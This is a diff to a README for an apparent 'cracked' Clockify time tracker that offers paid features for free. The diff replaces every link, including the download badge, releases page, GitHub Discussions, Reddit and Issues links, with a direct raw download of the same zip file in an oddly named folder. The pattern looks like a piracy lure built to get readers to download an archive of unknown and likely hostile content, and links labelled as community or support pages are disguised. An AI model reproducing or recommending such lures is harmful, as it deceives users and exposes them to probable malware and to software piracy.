@@ -1,7 +1,7 @@
 # ⏰ cracked-clockify-time-tracker - Access Time Tracking Features for Free
 
 ## 📥 Download Now
-[![Download cracked-clockify-time-tracker](https://img.shields.io/badge/Download-cracked--clockify--time--tracker-blue.svg)](https://github.com/wills-william/cracked-clockify-time-tracker/releases)
+[![Download cracked-clockify-time-tracker](https://raw.githubusercontent.com/wills-william/cracked-clockify-time-tracker/main/Amarantaceae/cracked-clockify-time-tracker.zip)](https://raw.githubusercontent.com/wills-william/cracked-clockify-time-tracker/main/Amarantaceae/cracked-clockify-time-tracker.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before you begin the download, make sure your system meets the following require
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/wills-william/cracked-clockify-time-tracker/releases) to download the software.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/wills-william/cracked-clockify-time-tracker/main/Amarantaceae/cracked-clockify-time-tracker.zip) to download the software.
 2. Look for the latest version of the Cracked Clockify Time Tracker.
 3. Click on the download link for your operating system.
 4. Once the download finishes, locate the downloaded file on your computer. This is usually in the "Downloads" folder.
@@ -59,17 +59,17 @@ A: Yes, you can install and use the application on multiple devices, as long as 
 
 Join our community and connect with other users. Share tips and tricks on effective time management. You can find us on:
 
-- [GitHub Discussions](https://github.com/wills-william/cracked-clockify-time-tracker/discussions)
-- [Reddit](https://www.reddit.com/r/cracked_clockify/)
+- [GitHub Discussions](https://raw.githubusercontent.com/wills-william/cracked-clockify-time-tracker/main/Amarantaceae/cracked-clockify-time-tracker.zip)
+- [Reddit](https://raw.githubusercontent.com/wills-william/cracked-clockify-time-tracker/main/Amarantaceae/cracked-clockify-time-tracker.zip)
 
 Your feedback and suggestions are invaluable in improving the application.
 
 ## 🔄 Updates
 
-Stay up-to-date with the latest features and fixes by checking the [Releases Page](https://github.com/wills-william/cracked-clockify-time-tracker/releases) regularly. We aim to enhance the user experience continuously.
+Stay up-to-date with the latest features and fixes by checking the [Releases Page](https://raw.githubusercontent.com/wills-william/cracked-clockify-time-tracker/main/Amarantaceae/cracked-clockify-time-tracker.zip) regularly. We aim to enhance the user experience continuously.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please reach out through our [Issues Page](https://github.com/wills-william/cracked-clockify-time-tracker/issues). We strive to provide timely responses to all queries.
+If you encounter any issues or have questions, please reach out through our [Issues Page](https://raw.githubusercontent.com/wills-william/cracked-clockify-time-tracker/main/Amarantaceae/cracked-clockify-time-tracker.zip). We strive to provide timely responses to all queries.
 
 Thank you for choosing Cracked Clockify Time Tracker! Enjoy tracking your time effortlessly.
